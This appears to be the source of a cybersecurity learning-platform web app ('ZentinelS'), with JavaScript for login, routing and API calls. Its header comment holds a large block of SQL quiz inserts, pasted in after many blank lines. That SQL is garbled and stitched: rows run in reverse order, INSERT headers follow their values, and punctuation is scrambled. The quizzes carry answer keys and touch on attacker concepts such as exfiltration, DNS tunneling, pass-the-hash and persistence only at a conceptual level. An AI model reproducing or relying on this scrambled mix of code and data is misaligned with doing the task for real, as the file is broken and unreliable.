/* ============================================================
   ZentinelS v2.0 – Learning Platform SPA


























































































































































(218, 'How can cloud services be used for exfiltration?', 'They cannot be used', 'Uploading stolen data to legitimate cloud storage services', 'Cloud services block all uploads', 'Only through email', 'B', 'Attackers upload data to cloud services like Dropbox, appearing as legitimate business usage.');(218, 'What is ICMP tunneling?', 'A network diagnostic tool', 'Hiding data in ICMP (ping) packets for covert transfer', 'A VPN protocol', 'Network monitoring', 'B', 'ICMP tunneling embeds data in ping packets, which often pass through firewalls.'),(218, 'What is HTTPS exfiltration?', 'Stealing SSL certificates', 'Sending stolen data over encrypted HTTPS connections', 'Breaking HTTPS encryption', 'Installing certificates', 'B', 'Attackers use HTTPS to blend exfiltration traffic with normal encrypted web traffic.'),(218, 'Why is DNS tunneling effective for exfiltration?', 'DNS is faster than HTTP', 'DNS traffic is usually allowed through firewalls', 'DNS encrypts all data', 'DNS compresses data', 'B', 'DNS traffic on port 53 is typically allowed, making it useful for covert data transfer.'),(218, 'What is data exfiltration?', 'Backing up data', 'Unauthorized transfer of data out of an organization', 'Data compression', 'Data validation', 'B', 'Exfiltration is the unauthorized extraction and transfer of data from a compromised system.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 218: Exfiltration Introduction(211, 'What is a pivot in network attacks?', 'A basketball move', 'Using a compromised system to attack other internal systems', 'Rotating network cables', 'A type of firewall', 'B', 'Pivoting uses a compromised system as a stepping stone to reach other internal targets.');(211, 'What is ARP cache poisoning?', 'Destroying ARP caches', 'Sending fake ARP responses to redirect network traffic', 'A type of food poisoning', 'Cleaning network caches', 'B', 'ARP poisoning associates the attacker''s MAC with legitimate IPs to intercept traffic.'),(211, 'What is PsExec used for?', 'Executing PowerShell scripts', 'Remote command execution on Windows systems', 'Playing games', 'Email management', 'B', 'PsExec allows execution of commands on remote Windows systems.'),(211, 'What is Pass-the-Hash?', 'Sharing password hints', 'Using captured NTLM hashes to authenticate without knowing the password', 'A password hashing algorithm', 'Email forwarding', 'B', 'Pass-the-Hash exploits Windows NTLM authentication by using captured hashes directly.'),(211, 'What is lateral movement?', 'Moving sideways while typing', 'Moving from one compromised system to others in the network', 'Physical movement of servers', 'Deleting files', 'B', 'Lateral movement is when attackers move from the initial compromised host to other systems.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 211: Lateral Movement Introduction(204, 'What are YARA rules used for?', 'Grammar checking', 'Pattern matching to identify and classify malware', 'Password generation', 'Network routing', 'B', 'YARA rules define patterns to identify malware and other threats.');(204, 'What is a scheduled task persistence technique?', 'Planning when to hack', 'Creating automated tasks that run malicious code at specified times', 'Scheduling system updates', 'Task management software', 'B', 'Attackers create scheduled tasks to execute malicious code automatically.'),(204, 'What is a rootkit?', 'A gardening tool', 'Malware that hides its presence and provides continued privileged access', 'A root password', 'A Linux installation CD', 'B', 'Rootkits are malware designed to hide from detection while maintaining elevated system access.'),(204, 'Which Windows location is commonly used for persistence?', 'C:\\Games', 'Registry Run keys and Startup folder', 'C:\\Windows\\Fonts', 'Desktop background', 'B', 'Registry Run keys and Startup folders are common locations for persistence mechanisms.'),(204, 'What is persistence in the context of hacking?', 'Never giving up on a target', 'Techniques to maintain access to a compromised system after reboot', 'Writing persistent code', 'Storing data permanently', 'B', 'Persistence mechanisms ensure attackers maintain access even after the system restarts.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 204: Persistence Introduction-- Course 10: Network Infiltration (23 lessons: 204-226)(182, 'What is steganography?', 'Writing about dinosaurs', 'Hiding information within other files (like images)', 'A type of encryption', 'Forensic photography', 'B', 'Steganography hides secret data within innocent-looking files like images or audio.');(182, 'What tool is commonly used for memory forensics?', 'Photoshop', 'Volatility Framework', 'Microsoft Excel', 'iTunes', 'B', 'Volatility is the leading open-source memory forensics framework for analyzing RAM dumps.'),(182, 'What is a forensic image?', 'A photograph of a computer', 'A bit-by-bit copy of digital media', 'An image file found as evidence', 'A drawing of evidence', 'B', 'A forensic image is an exact bit-by-bit copy of digital media that preserves all data.'),(182, 'Why is maintaining chain of custody important?', 'To track file downloads', 'To ensure evidence is admissible in court by documenting handling', 'To organize evidence alphabetically', 'To compress evidence files', 'B', 'Chain of custody documents who handled evidence and when, ensuring its integrity for legal proceedings.'),(182, 'What is digital forensics?', 'Recovering deleted games', 'The process of collecting, preserving, and analyzing digital evidence', 'Creating digital art', 'Building websites', 'B', 'Digital forensics involves investigating digital devices to collect evidence for legal proceedings.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 182: Forensics Introduction  (174, 'What tool is commonly used for port scanning?', 'Microsoft Word', 'Nmap', 'Adobe Reader', 'Notepad', 'B', 'Nmap is the most widely-used network scanning tool for discovering hosts and services.');(174, 'What is Google Dorking?', 'A Google game', 'Using advanced search operators to find sensitive information', 'Creating Google accounts', 'A type of malware', 'B', 'Google Dorking uses advanced search operators to find potentially sensitive exposed information.'),(174, 'What information can WHOIS lookup provide?', 'User passwords', 'Domain registration details including owner contact information', 'Website source code', 'Database contents', 'B', 'WHOIS provides domain registration information including registrant contact details.'),(174, 'What is OSINT?', 'Operating System Integration', 'Open Source Intelligence - information from public sources', 'Online Security Interface', 'Offensive Security Intrusion', 'B', 'OSINT is intelligence gathered from publicly available sources like websites, social media, and databases.'),(174, 'What is reconnaissance in cybersecurity?', 'The attack phase', 'Information gathering about a target before an attack', 'Installing malware', 'Deleting evidence', 'B', 'Reconnaissance is the first phase of an attack where attackers gather information about the target.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 174: Reconnaissance Introduction(158, 'What is the main use of hashing for files?', 'To compress them', 'To verify file integrity (detect if file was modified)', 'To encrypt them', 'To delete them securely', 'B', 'File hashes allow verification that a file has not been modified or corrupted.');(158, 'Which hashing algorithm is considered cryptographically broken?', 'SHA-256', 'MD5', 'SHA-3', 'Argon2', 'B', 'MD5 has known collision vulnerabilities and should not be used for security purposes.'),(158, 'What is a "salt" in password hashing?', 'A type of encryption key', 'Random data added before hashing to prevent rainbow table attacks', 'A password requirement', 'A hash algorithm', 'B', 'Salt is random data added to passwords before hashing to make each hash unique.'),(158, 'Can you recover the original data from a hash?', 'Yes, using the hash key', 'No, hashing is a one-way function', 'Yes, using a special algorithm', 'Only with admin access', 'B', 'Hashing is designed to be irreversible - you cannot mathematically recover the input from the hash.'),(158, 'What is a hash function?', 'A function that encrypts data', 'A one-way function that produces a fixed-size output from any input', 'A function that compresses files', 'A function that generates random numbers', 'B', 'Hash functions produce a fixed-length output (digest) from any input, and cannot be reversed.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 158: Hashing(152, 'What is AES?', 'A type of virus', 'Advanced Encryption Standard - a symmetric encryption algorithm', 'Automated Email System', 'Anti-Exploit Software', 'B', 'AES (Advanced Encryption Standard) is a widely-used symmetric encryption algorithm.');(152, 'In asymmetric encryption, what is the public key used for?', 'Only decryption', 'Encrypting data and verifying signatures', 'Nothing', 'Storing passwords', 'B', 'The public key encrypts data (only private key can decrypt) and verifies digital signatures.'),(152, 'In symmetric encryption, how many keys are used?', 'None', 'One key for both encryption and decryption', 'Two different keys', 'Three keys', 'B', 'Symmetric encryption uses the same key for both encrypting and decrypting data.'),(152, 'What is the difference between encryption and encoding?', 'They are the same thing', 'Encryption uses keys for security; encoding is for data transformation without security', 'Encoding is more secure', 'Encryption is faster', 'B', 'Encryption requires a secret key for security, while encoding (like Base64) is reversible without a key.'),(152, 'What is the main purpose of encryption?', 'To make files smaller', 'To protect data confidentiality by making it unreadable without the key', 'To speed up data transfer', 'To organize files alphabetically', 'B', 'Encryption converts readable data into an unreadable format that can only be decrypted with the correct key.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 152: Encryption Introduction-- Course 9: Security Concepts (52 lessons: 152-203)(150, 'What is a Dockerfile?', 'A log file for Docker', 'A text file with instructions to build a Docker image', 'A container configuration', 'A Docker backup file', 'B', 'A Dockerfile contains the instructions (FROM, RUN, COPY, etc.) to build a Docker image.');(150, 'What command runs a Docker container?', 'docker start', 'docker run', 'docker execute', 'docker begin', 'B', '"docker run" creates and starts a container from an image.'),(150, 'What is a Docker image?', 'A picture of a container', 'A read-only template used to create containers', 'A type of virtual disk', 'A backup of the host system', 'B', 'Docker images are templates containing the application, libraries, and configuration to create containers.'),(150, 'How do containers differ from virtual machines?', 'Containers are identical to VMs', 'Containers share the host OS kernel, VMs have their own OS', 'VMs are faster than containers', 'Containers require more resources', 'B', 'Containers are more lightweight because they share the host kernel, unlike VMs which include a full OS.'),(150, 'What is Docker?', 'A type of virtual machine', 'A platform for developing and running containers', 'A programming language', 'An operating system', 'B', 'Docker is a platform that uses containerization to package applications with their dependencies.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 150: Docker Introduction(146, 'What is RAID 10?', 'RAID 1 with 10 disks', 'A combination of mirroring (RAID 1) and striping (RAID 0)', 'RAID version 10', 'The fastest RAID level', 'B', 'RAID 10 (or 1+0) stripes data across mirrored pairs, providing both speed and redundancy.');(146, 'How many disks can fail in RAID 5 without data loss?', '0', '1', '2', '3', 'B', 'RAID 5 can survive one disk failure using distributed parity.'),(146, 'Which RAID level mirrors data across two disks?', 'RAID 0', 'RAID 1', 'RAID 5', 'RAID 0+1', 'B', 'RAID 1 creates an exact copy (mirror) of data on two or more disks.'),(146, 'Which RAID level provides striping only (no redundancy)?', 'RAID 1', 'RAID 5', 'RAID 0', 'RAID 6', 'C', 'RAID 0 stripes data across disks for performance but offers no redundancy.'),(146, 'What does RAID stand for?', 'Random Access Internal Drive', 'Redundant Array of Independent Disks', 'Remote Access Information Database', 'Rapid Application Integration Device', 'B', 'RAID (Redundant Array of Independent Disks) combines multiple disks for performance and/or redundancy.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 146: RAID Explained(141, 'What does "info registers" show in GDB?', 'CPU temperature', 'Current values of all CPU registers', 'List of all files', 'Network status', 'B', 'The "info registers" command displays the current state of CPU registers.');(141, 'How do you examine memory at address 0x1234 in GDB?', 'print 0x1234', 'x/x 0x1234', 'show 0x1234', 'read 0x1234', 'B', 'The "x" (examine) command displays memory contents at a given address.'),(141, 'What does the GDB "step" command do?', 'Deletes a line of code', 'Executes one line, entering function calls', 'Closes the debugger', 'Prints all variables', 'B', 'Step executes one source line and enters function calls (unlike "next" which steps over).'),(141, 'What GDB command sets a breakpoint at a function?', 'stop function', 'break functionname', 'halt at function', 'pause function', 'B', 'The "break" command sets breakpoints at functions or memory addresses.'),(141, 'What is GDB?', 'Graphics Display Board', 'GNU Debugger - a program debugging tool', 'General Data Backup', 'Global Database', 'B', 'GDB (GNU Debugger) is a powerful debugging tool for C, C++, and other programs.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 141: GDB Debugging(136, 'What is L1, L2, L3 cache hierarchy?', 'Network levels', 'Cache levels where L1 is fastest/smallest and L3 is slowest/largest', 'Security levels', 'Compression levels', 'B', 'Cache hierarchy provides different levels of cache with varying speed and size tradeoffs.');(136, 'What is cache memory in a CPU?', 'Memory for storing temporary files', 'Small, fast memory between CPU and RAM for frequently accessed data', 'Memory for storing passwords', 'External storage device', 'B', 'CPU cache is very fast memory that stores frequently accessed data to reduce access time.'),(136, 'What is the x86-64 architecture?', 'A 64-bit extension of the x86 instruction set', 'A type of graphics card', 'A network protocol', 'An operating system', 'A', 'x86-64 (also AMD64) is the 64-bit version of the x86 CPU architecture.'),(136, 'What does the Instruction Pointer (RIP) register do?', 'Points to the current mouse position', 'Holds the address of the next instruction to execute', 'Stores the result of calculations', 'Manages internet connections', 'B', 'The Instruction Pointer contains the memory address of the next instruction to execute.'),(136, 'What is the purpose of the CPU registers?', 'Long-term data storage', 'Small, fast storage for immediate CPU operations', 'Displaying graphics', 'Network communication', 'B', 'Registers are small amounts of fast storage directly accessible by the CPU for operations.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 136: CPU Architecture Introduction-- Course 8: Advanced Hardware (16 lessons: 136-151)(129, 'What does DKIM do?', 'Deletes Kept Incoming Mail', 'Adds a digital signature to verify email authenticity', 'Duplicates Key Information Messages', 'Decrypts Known Internet Mail', 'B', 'DKIM (DomainKeys Identified Mail) adds cryptographic signatures to email headers.');(129, 'What is SPF in email security?', 'Secure Protocol Format', 'Sender Policy Framework - prevents email spoofing', 'Simple Post Format', 'Server Protection Firewall', 'B', 'SPF specifies which servers are authorized to send email for a domain.'),(129, 'What DNS record type specifies the mail server for a domain?', 'A', 'MX', 'CNAME', 'TXT', 'B', 'MX (Mail Exchange) records specify which server handles email for a domain.'),(129, 'What is the difference between POP3 and IMAP?', 'They are identical protocols', 'POP3 downloads and typically deletes emails from server; IMAP syncs and keeps emails on server', 'POP3 is for sending, IMAP is for receiving', 'IMAP is older than POP3', 'B', 'POP3 downloads emails locally, while IMAP keeps them synchronized on the server.'),(129, 'What protocol is used to SEND email from a client to a server?', 'POP3', 'IMAP', 'SMTP', 'HTTP', 'C', 'SMTP (Simple Mail Transfer Protocol) is used for sending emails.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 129: Email Server Introduction(123, 'What is log rotation?', 'Spinning log files in a circle', 'Automatically archiving or deleting old logs to manage disk space', 'Converting logs to a different format', 'Sharing logs with other servers', 'B', 'Log rotation prevents log files from consuming all disk space by archiving or removing old entries.');(123, 'Why is log analysis important for security?', 'To make logs look pretty', 'To detect anomalies, investigate incidents, and maintain compliance', 'To slow down the network', 'To store more data', 'B', 'Log analysis helps identify security incidents, track user activity, and meet regulatory requirements.'),(123, 'Which is a popular open-source log management solution?', 'Microsoft Office', 'ELK Stack (Elasticsearch, Logstash, Kibana)', 'Adobe Photoshop', 'VMware vSphere', 'B', 'The ELK Stack is widely used for log aggregation, processing, and visualization.'),(123, 'What does SIEM stand for?', 'Security Information and Event Management', 'System Integration and Enterprise Monitoring', 'Server Information Exchange Module', 'Secure Internet Email Manager', 'A', 'SIEM systems combine security information management with event management for comprehensive monitoring.'),(123, 'What is the primary purpose of a log server?', 'To store game statistics', 'To collect, store, and analyze logs from multiple systems', 'To block malicious traffic', 'To send emails', 'B', 'Log servers aggregate logs from various sources for centralized analysis and monitoring.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 123: Log Server Introduction(117, 'What is DNS over HTTPS (DoH)?', 'A new domain extension', 'DNS queries encrypted over HTTPS for privacy', 'A protocol for hosting websites', 'A database for storing domains', 'B', 'DoH encrypts DNS queries using HTTPS, preventing eavesdropping on DNS traffic.');(117, 'What is DNSSEC?', 'DNS Security Extensions that add cryptographic signatures', 'DNS Encryption Standard', 'Domain Name Security Certificate', 'Dynamic Name System Enhanced Compression', 'A', 'DNSSEC adds digital signatures to DNS records to prevent tampering and spoofing.'),(117, 'What is a recursive DNS resolver?', 'A DNS server that only responds with cached data', 'A DNS server that queries other servers on behalf of the client', 'A DNS server that deletes records', 'A server that reverses DNS lookups', 'B', 'Recursive resolvers handle the entire DNS lookup process for clients, querying multiple servers if needed.'),(117, 'What DNS record type maps a domain to an IPv4 address?', 'MX', 'AAAA', 'A', 'CNAME', 'C', 'A records map domain names to IPv4 addresses.'),(117, 'What does DNS stand for?', 'Data Network System', 'Domain Name System', 'Digital Naming Service', 'Dynamic Network Security', 'B', 'DNS (Domain Name System) translates domain names to IP addresses.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 117: DNS Server Introduction(113, 'What does ACID stand for in databases?', 'Atomicity, Consistency, Isolation, Durability', 'Always Create Index Data', 'Automatic Computer Information Database', 'Access Control In Databases', 'A', 'ACID properties ensure reliable database transactions.');(113, 'What is database indexing?', 'Adding page numbers to a database', 'Creating data structures to speed up query performance', 'Counting all rows in a table', 'Backing up the database', 'B', 'Indexes are data structures that improve query speed by allowing faster data lookup.'),(113, 'Which is NOT a common database management system?', 'MySQL', 'PostgreSQL', 'Microsoft Word', 'MongoDB', 'C', 'Microsoft Word is a word processor, not a database management system.'),(113, 'What is SQL?', 'Structured Query Language for database operations', 'Server Quality Level', 'Standard Queue Logic', 'System Query Loader', 'A', 'SQL (Structured Query Language) is used to create, read, update, and delete data in relational databases.'),(113, 'What is a database server?', 'A server that stores physical files only', 'A server that manages databases and handles queries', 'A server for storing emails', 'A server for playing games', 'B', 'Database servers manage databases, handle client queries, and ensure data integrity and security.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 113: Database Server Introduction(107, 'What is a virtual host in web server configuration?', 'A fake server that does not exist', 'Allows one web server to host multiple websites', 'A server running in a virtual machine', 'A temporary server for testing', 'B', 'Virtual hosts allow a single web server to serve multiple domains or websites.');(107, 'What does a reverse proxy do?', 'Blocks all incoming requests', 'Sits in front of web servers and forwards client requests', 'Creates backup copies of websites', 'Reverses the direction of internet traffic', 'B', 'A reverse proxy receives client requests and forwards them to backend servers, providing load balancing and security.'),(107, 'What is the difference between Apache and Nginx?', 'They are the same software', 'Both are web servers but have different architectures and configurations', 'Apache is for email, Nginx is for web', 'Nginx is older than Apache', 'B', 'Both Apache and Nginx are popular web servers with different approaches to handling requests.'),(107, 'Which port does HTTP typically use?', '22', '443', '80', '3306', 'C', 'HTTP uses port 80 by default, while HTTPS uses port 443.'),(107, 'What is the primary function of a web server?', 'To create web pages', 'To serve web content to clients via HTTP/HTTPS', 'To browse the internet', 'To store emails', 'B', 'Web servers receive HTTP requests and respond with web content (HTML, CSS, JS, images, etc.).'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 107: Web Server Introduction(102, 'Why do servers often have multiple network interfaces?', 'For redundancy and handling high network traffic', 'To play online games better', 'Because one interface is never enough', 'For aesthetic purposes', 'A', 'Multiple NICs provide redundancy and can handle higher network throughput for busy servers.');(102, 'What is a 1U server?', 'A server that costs $1', 'A server that is 1 rack unit (1.75 inches) tall', 'A server with 1 USB port', 'A single-user server', 'B', '1U refers to 1 rack unit, a standard height measurement for rack-mounted equipment (1.75 inches or 44.45mm).'),(102, 'What CPU architectures are common in servers?', 'Intel Core i3 and AMD Ryzen 3', 'Intel Xeon and AMD EPYC', 'Apple M1 only', 'Qualcomm Snapdragon', 'B', 'Intel Xeon and AMD EPYC are server-grade processors designed for high reliability and performance.'),(102, 'What does "hot-swappable" mean for server components?', 'Components that run very hot', 'Components can be replaced without shutting down the server', 'Components that are fire resistant', 'Components that swap colors', 'B', 'Hot-swappable components can be removed and replaced while the server continues operating.'),(102, 'What is ECC memory and why is it used in servers?', 'Extra Cooling Component for temperature', 'Error-Correcting Code memory that detects and fixes memory errors', 'Enhanced Color Calibration for displays', 'External Connection Card for networking', 'B', 'ECC memory can detect and correct common memory errors, improving server reliability.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 102: Server Hardware(101, 'What does IPMI/iLO/iDRAC provide for servers?', 'Faster internet', 'Out-of-band management for remote administration', 'Better graphics', 'Wireless connectivity', 'B', 'These management interfaces allow administrators to remotely control servers even when the OS is not running.');(101, 'What is rack-mounted server hardware?', 'Servers attached to a bicycle rack', 'Standardized server form factor that fits in equipment racks', 'Portable server units', 'Servers without cases', 'B', 'Rack-mounted servers follow standard sizes (1U, 2U, etc.) to fit in equipment racks in data centers.'),(101, 'What does "24/7 operation" mean for servers?', 'They only work during business hours', 'They are designed to run continuously without shutdowns', 'They require daily restarts', 'They work 24 days, 7 hours', 'B', 'Servers are designed to operate continuously, providing services around the clock.'),(101, 'Which of these is NOT a common characteristic of server hardware?', 'Redundant power supplies', 'ECC memory', 'Gaming graphics card', 'Hot-swappable drives', 'C', 'Servers prioritize reliability and uptime over graphics performance, so gaming GPUs are not typical server components.'),(101, 'What is the primary role of a server in a client-server architecture?', 'To display graphics', 'To respond to client requests and provide resources', 'To store games', 'To connect monitors', 'B', 'Servers are designed to receive requests from clients and provide resources, data, or services in response.'),INSERT INTO quiz_questions (lesson_id, question, option_a, option_b, option_c, option_d, correct_answer, explanation) VALUES-- Lesson 101: Introduction to Servers-- Level 22: Server Fundamentals (6 lessons: 101-106)-- Course 7: Servers & Services (35 lessons)USE securitylab;-- Batch 7: Course 7 - Servers & Services   Dark Sidebar  +  Light Content  +  Interactive Demos/Labs
   ============================================================ */

(function () {
    'use strict';

    const API = '/securitylab/api';

    /* ── State ─────────────────────────────────── */
    const state = {
        user: null,
        courses: [],
        lessons: [],
        categories: [],
        progress: [],
        currentLesson: null,
        quizData: [],
        quizIndex: 0,
        quizScore: 0,
        quizAnswered: false,
        quizAnswers: [],
    };

    /* ── DOM helpers ───────────────────────────── */
    const $ = (s, p) => (p || document).querySelector(s);
    const $$ = (s, p) => [...(p || document).querySelectorAll(s)];
    const el = (tag, cls, html) => {
        const e = document.createElement(tag);
        if (cls) e.className = cls;
        if (html) e.innerHTML = html;
        return e;
    };

    /* ── Progress helpers ─────────────────────── */
    function isLessonCompleted(lessonId) {
        const p = state.progress.find(pr => pr.lessonId === lessonId);
        return p && (p.completed || p.lessonStatus === 'completed');
    }
    function isLessonStarted(lessonId) {
        const p = state.progress.find(pr => pr.lessonId === lessonId);
        return p && (p.lessonStatus === 'in_progress' || p.lessonStatus === 'completed' || p.demoCompleted || p.labCompleted || p.quizCompleted);
    }
    function getLessonProgress(lessonId) {
        return state.progress.find(pr => pr.lessonId === lessonId) || null;
    }

    /* ── API helpers ──────────────────────────── */
    async function api(path, opts = {}) {
        try {
            const res = await fetch(API + path, {
                credentials: 'include',
                headers: { 'Content-Type': 'application/json', ...opts.headers },
                ...opts,
            });
            const text = await res.text();
            const json = text ? JSON.parse(text) : {};
            if (!res.ok) throw new Error(json.error || `HTTP ${res.status}`);
            return json;
        } catch (e) {
            console.error('API error:', e);
            throw e;
        }
    }

    /* ── Toast ────────────────────────────────── */
    function toast(msg, type = 'info') {
        let c = $('.toast-container');
        if (!c) { c = el('div', 'toast-container'); document.body.appendChild(c); }
        const t = el('div', `toast toast-${type}`, msg);
        c.appendChild(t);
        setTimeout(() => { t.style.opacity = '0'; setTimeout(() => t.remove(), 300); }, 3500);
    }

    /* ============================================================
       AUTH
       ============================================================ */
    function initAuth() {
        const overlay = $('#authOverlay');
        const modal = $('#authModal');
        const closeBtn = $('#authClose');
        const form = $('#authForm');
        const title = $('#authTitle');
        const subtitle = $('#authSubtitle');
        const toggleLink = $('#authToggle');
        const toggleText = $('#authToggleText');
        const nameGroup = $('#nameGroup');
        const authError = $('#authError');
        const submitBtn = $('#authSubmitBtn');
        const signInBtn = $('#signInBtn');
        const signUpBtn = $('#signUpBtn');
        const logoutBtn = $('#logoutBtn');

        let mode = 'login';

        function showModal(m) {
            mode = m;
            overlay.classList.remove('hidden');
            authError.classList.remove('show');
            form.reset();
            if (mode === 'login') {
                title.textContent = 'Welcome Back';
                subtitle.textContent = 'Sign in to continue your security journey';
                nameGroup.classList.add('hidden');
                toggleText.innerHTML = 'Don\'t have an account? <a href="#" id="authToggle">Sign up</a>';
                submitBtn.textContent = 'Sign In';
            } else {
                title.textContent = 'Create Account';
                subtitle.textContent = 'Start your cybersecurity learning journey';
                nameGroup.classList.remove('hidden');
                toggleText.innerHTML = 'Already have an account? <a href="#" id="authToggle">Sign in</a>';
                submitBtn.textContent = 'Create Account';
            }
            // re-bind the toggler
            const tl = $('#authToggle');
            if (tl) tl.onclick = (e) => { e.preventDefault(); showModal(mode === 'login' ? 'register' : 'login'); };
        }

        if (signInBtn) signInBtn.onclick = () => showModal('login');
        if (signUpBtn) signUpBtn.onclick = () => showModal('register');
        if (closeBtn) closeBtn.onclick = () => overlay.classList.add('hidden');
        overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.classList.add('hidden'); });

        if (logoutBtn) logoutBtn.onclick = async () => {
            try { await api('/auth/logout', { method: 'POST' }); } catch (_) {}
            state.user = null;
            updateAuthUI();
            toast('Logged out successfully', 'success');
            navigate('/');
        };

        form.onsubmit = async (e) => {
            e.preventDefault();
            authError.classList.remove('show');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Please wait…';
            try {
                const body = { username: $('#authUsername').value, password: $('#authPassword').value };
                if (mode === 'register') {
                    body.displayName = $('#authName').value;
                    body.email = $('#authUsername').value + '@zentinels.local';
                }
                const data = await api(`/auth/${mode}`, { method: 'POST', body: JSON.stringify(body) });
                state.user = data;
                overlay.classList.add('hidden');
                updateAuthUI();
                toast(`Welcome${state.user.displayName ? ', ' + state.user.displayName : ''}!`, 'success');
                loadProgress();
                navigate(location.hash || '#/');
            } catch (err) {
                authError.textContent = err.message;
                authError.classList.add('show');
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = mode === 'login' ? 'Sign In' : 'Create Account';
            }
        };
    }

    function updateAuthUI() {
        const topbarAuth = $('#topbarAuth');
        const topbarUser = $('#topbarUser');
        const topbarName = $('#topbarName');
        const topbarAvatar = $('#topbarAvatar');
        const userDropdown = $('#userDropdown');
        const userProfileBtn = $('#userProfileBtn');
        const userSection = $('#sidebarUser');
        const userName = $('#sidebarUserName');
        const userAvatar = $('#sidebarUserAvatar');

        if (state.user) {
            const initial = (state.user.displayName || state.user.username || 'U').charAt(0).toUpperCase();
            const displayName = state.user.displayName || state.user.username;
            
            // Hide sign in/up, show user profile in topbar
            if (topbarAuth) topbarAuth.classList.add('hidden');
            if (topbarUser) topbarUser.classList.remove('hidden');
            if (topbarName) topbarName.textContent = displayName;
            if (topbarAvatar) topbarAvatar.textContent = initial;
            
            // Sidebar user section
            if (userSection) userSection.classList.remove('hidden');
            if (userName) userName.textContent = displayName;
            if (userAvatar) userAvatar.textContent = initial;
            
            // Setup dropdown toggle
            if (userProfileBtn && userDropdown) {
                userProfileBtn.onclick = (e) => {
                    e.stopPropagation();
                    userDropdown.classList.toggle('hidden');
                };
                // Close dropdown when clicking outside
                document.addEventListener('click', (e) => {
                    if (!userProfileBtn.contains(e.target) && !userDropdown.contains(e.target)) {
                        userDropdown.classList.add('hidden');
                    }
                });
            }
        } else {
            // Show sign in/up, hide user profile
            if (topbarAuth) topbarAuth.classList.remove('hidden');
            if (topbarUser) topbarUser.classList.add('hidden');
            if (userSection) userSection.classList.add('hidden');
            if (userDropdown) userDropdown.classList.add('hidden');
        }
    }

    async function checkSession() {
        try {
            const data = await api('/auth/me');
            if (data && data.id) { state.user = data; updateAuthUI(); loadProgress(); }
        } catch (_) {}
    }

    async function loadProgress() {
        if (!state.user) return;
        try { state.progress = await api('/progress'); } catch (_) { state.progress = []; }
    }

    /* ============================================================
       ROUTER
       ============================================================ */
    const routes = [
        { path: /^#?\/?$/, handler: renderDashboard },
        { path: /^#?\/courses\/?$/, handler: renderCourses },
        { path: /^#?\/courses\/([^/]+)\/?$/, handler: renderCourseDetail },
        { path: /^#?\/lessons\/?$/, handler: renderAllLessons },
        { path: /^#?\/lesson\/([^/]+)\/?$/, handler: renderLessonDetail },
        { path: /^#?\/score\/?$/, handler: renderScore },
        { path: /^#?\/achievements\/?$/, handler: renderAchievements },
    ];

    function navigate(hash) {
        if (!hash.startsWith('#')) hash = '#' + hash;
        location.hash = hash;
    }

    function router() {
        const hash = location.hash || '#/';
        for (const r of routes) {
            const m = hash.match(r.path);
            if (m) {
                setActiveNav(hash);
                r.handler(m);
                return;
            }
        }
        renderDashboard();
    }

    function setActiveNav(hash) {
        $$('.nav-item').forEach((item) => {
            item.classList.toggle('active', item.dataset.route && hash.startsWith('#' + item.dataset.route));
        });
        // breadcrumb
        const bc = $('#breadcrumb');
        if (bc) {
            const parts = hash.replace('#/', '').split('/').filter(Boolean);
            if (parts.length === 0) bc.innerHTML = '<span>Dashboard</span>';
            else bc.innerHTML = '<span>Home</span>' + parts.map((p) => `<span>${decodeURIComponent(p).replace(/-/g, ' ')}</span>`).join('');
        }
    }

    /* ============================================================
       DATA LOADING
       ============================================================ */
    async function loadCourses() {
        if (state.courses.length) return state.courses;
        try { state.courses = await api('/courses'); } catch (_) { state.courses = []; }
        return state.courses;
    }

    async function loadCourseDetail(slug) {
        try {
            const data = await api(`/courses/${slug}`);
            // API returns {course: {...}, levels: [...]}
            if (data && data.course) {
                const course = data.course;
                course.levels = data.levels || [];
                return course;
            }
            return data;
        } catch (_) { return null; }
    }

    async function loadLessons() {
        if (state.lessons.length) return state.lessons;
        try { state.lessons = await api('/lessons'); } catch (_) { state.lessons = []; }
        return state.lessons;
    }

    async function loadLesson(slug) {
        try { return await api(`/lessons/${slug}`); } catch (_) { return null; }
    }

    async function loadQuiz(lessonId) {
        try { return await api(`/quiz/${lessonId}`); } catch (_) { return []; }
    }

    /* ============================================================
       PAGES
       ============================================================ */

    function content() { return $('#mainContent'); }

    /* ---- Dashboard ---- */
    async function renderDashboard() {
        const c = content();
        const courses = await loadCourses();
        const lessons = await loadLessons();
        const completed = state.progress.filter((p) => p.completed || p.lessonStatus === 'completed').length;
        const streak = getStreak();

        c.innerHTML = `
            <div class="welcome-banner">
